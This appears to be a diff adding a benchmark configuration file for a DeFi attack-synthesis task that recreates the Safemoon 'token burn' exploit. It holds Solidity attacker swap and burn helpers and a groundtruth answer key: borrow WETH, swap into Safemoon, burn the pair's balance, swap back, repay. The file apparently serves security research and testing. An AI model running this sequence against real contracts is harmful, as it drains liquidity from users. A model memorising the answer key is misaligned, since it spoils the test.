@@ -1,0 +1,130 @@
+# Information for benchmarks building.
+project_name: "Safemoon"
+
+ctrt_name2cls:
+  - ["safemoon", "Safemoon"]
+  - ["weth", "WETH"]
+  - ["feejar", "FeeJar"]
+  - ["feeJarAdmin", "FeeJarAdmin"]
+  - ["feeSetter", "FeeSetter"]
+  - ["buyBackAndBurnFeeCollector", "BuyBackAndBurnFeeCollector"]
+  - ["lpFeeCollector", "LpFeeCollector"]
+  - ["pair", "SafeswapPair"]
+  - ["factory", "SafeswapFactory"]
+  - ["tradeRouter", "SafeSwapTradeRouter"]
+  - ["router", "SafeswapRouterProxy1"]
+
+ctrt_name2deploy:
+  - ["safemoon", "new Safemoon ()"]
+  - ["weth", ""]
+  - ["pair", "new SafeswapPair ()"]
+  - ["feejar", "new FeeJar()"]
+  - ["feeJarAdmin", "new FeeJarAdmin()"]
+  - ["feeSetter", "new FeeSetter()"]
+  - ["buyBackAndBurnFeeCollector", "new BuyBackAndBurnFeeCollector()"]
+  - ["lpFeeCollector", "new LpFeeCollector()"]
+  - [
+      "factory", 
+      "new SafeswapFactory()",
+    ]
+  - ["tradeRouter", "new SafeSwapTradeRouter()"]
+  - ["router", "new SafeswapRouterProxy1()"]
+    
+extra_actions: 
+  - "function swap_safemoon_attacker_weth_safemoon(uint256 amount, uint256 amountOut) internal eurus {
+      address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(safemoon);
+
+        uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
+        weth.approve(address(safemoon.uniswapV2Router()), amount);
+        SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
+            amountIn: amount,
+            amountOut: 0,
+            path: path,
+            to: payable(address(attacker)),
+            deadline: block.timestamp
+        });
+        weth.transfer(address(tradeRouter), feeAmount);
+        tradeRouter.swapExactTokensForTokensWithFeeAmount(
+            trade
+        );
+    }"
+  - "function swap_safemoon_attacker_safemoon_weth(uint256 amount, uint256 amountOut) internal eurus {
+      address[] memory path = new address[](2);
+      path[0] = address(safemoon);
+      path[1] = address(weth);
+
+      uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
+      safemoon.approve(address(safemoon.uniswapV2Router()), amount);
+      SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
+          amountIn: amount,
+          amountOut: 0,
+          path: path,
+          to: payable(address(attacker)),
+          deadline: block.timestamp
+      });
+      weth.transfer(address(tradeRouter), feeAmount);
+      tradeRouter.swapExactTokensForTokensWithFeeAmount(
+          trade
+      );
+    }"
+  - "function burn_safemoon_pair(uint256 amount) internal eurus {
+      safemoon.burn(safemoon.uniswapV2Pair(), amount);
+      IUniswapV2Pair(safemoon.getPairAddr()).sync();  
+  }"
+
+
+extra_deployments:
+  - "
+    factory.initialize(address(0x0), address(0x0));
+    factory.setRouter(address(router));
+    factory.setImplementation(address(pair));
+    factory.approveLiquidityPartner(address(safemoon));
+    factory.approveLiquidityPartner(address(weth));
+    feejar.initialize(address(feeJarAdmin), address(feeSetter), address(buyBackAndBurnFeeCollector), address(lpFeeCollector), address(factory), 10000, 1200, 6800, 2000);
+    tradeRouter.initialize(address(feejar), address(router), 25, 10000);
+    router.initialize(address(factory), address(weth));
+    router.setRouterTrade(address(tradeRouter));
+    safemoon.initialize();
+    safemoon.initRouterAndPair(address(router));
+    weth.approve(address(safemoon), 27457 ether);
+    safemoon.afterDeploy();
+    "
+
+extra_statements:
+  - "vm.warp(blockTimestamp);
+    vm.roll(26854757);"
+
+attack_goal_str: "weth;1e6"
+
+groundtruth:
+  - ["borrow", "weth", "owner", "1000 ether"]
+  - ["swap", "safemoon", "attacker", "weth", "safemoon", "800 * 1e18", "0"]
+  - ["burn", "safemoon", "pair", "safemoon.balanceOf(safemoon.uniswapV2Pair()) - 1000000000"]
+  - ["swap", "safemoon", "attacker", "safemoon", "weth", "safemoon.balanceOf(address(attacker))", "0"]
+  - ["payback", "weth", "owner", "1000 ether"]
+
+
+# Information for search space building.
+roles:
+  "weth":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "safemoon":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["weth", "safemoon"]
+    support_swaps:
+      "weth": ["weth", "safemoon"]
+      "safemoon": ["weth", "safemoon"]
+    is_oracle: true
+    oracle: "pair"
+  
+
+pattern: "Token burn"
